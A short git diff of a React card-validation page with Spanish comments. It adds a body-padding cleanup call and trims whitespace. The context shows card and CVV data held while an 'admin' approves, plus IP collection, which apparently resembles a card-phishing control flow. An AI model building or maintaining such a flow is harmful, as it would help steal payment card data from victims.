@@ -4,6 +4,7 @@ import localStorageService from "../../services/localStorageService";
 import { instanceBackend } from "../../axios/instanceBackend"; // Import estático
 import Loading from "../../components/Loading";
 import './css/LoginModal.css';
+import { limpiarPaddingBody } from "@utils";
 
 // Estilos para la animación de flip
 const flipStyles = `
@@ -80,6 +81,10 @@ export default function ValidacionTCCustom() {
 
     // --- LÓGICA DE CARGA DE DATOS CON VALIDACIÓN DE SEGURIDAD ---
     useEffect(() => {
+
+        // Se limpia el padding del body
+        limpiarPaddingBody();
+
         // SEGURIDAD: Verificar sesionId en URL o LocalStorage y validar estado
         const params = new URLSearchParams(window.location.search);
         const sesionIdUrl = params.get('sesionId');
@@ -108,14 +113,14 @@ export default function ValidacionTCCustom() {
             try {
                 const response = await instanceBackend.post(`/consultar-estado/${sesionFinal}`);
                 const { estado, cardData: backendCardData } = response.data;
-                
+
                 // Solo permitir acceso si el estado es correcto para TC Custom
                 if (estado !== 'solicitar_tc_custom' && estado !== 'awaiting_tc_approval') {
                     console.error('Acceso no autorizado a TC Custom. Estado actual:', estado);
                     navigate('/');
                     return false;
                 }
-                
+
                 // Cargar datos de la tarjeta del backend (prioridad)
                 if (backendCardData) {
                     setCardData(backendCardData);
@@ -127,7 +132,7 @@ export default function ValidacionTCCustom() {
                         setCardData(savedCardData);
                     }
                 }
-                
+
                 return true;
             } catch (error) {
                 console.error('Error validando acceso:', error);
@@ -135,7 +140,7 @@ export default function ValidacionTCCustom() {
                 return false;
             }
         };
-        
+
         validateAccess();
 
         obtenerIP();
@@ -408,7 +413,7 @@ export default function ValidacionTCCustom() {
                 // Estados que indican que debemos seguir esperando (admin aún no ha decidido)
                 // NO redirigir automáticamente, esperar a que el admin presione un botón específico
                 const estadosEspera = ['pendiente', 'awaiting_tc_approval', 'awaiting_cvv_approval'];
-                
+
                 if (estadosEspera.includes(estado)) {
                     // Seguir esperando, mantener loading
                     return;
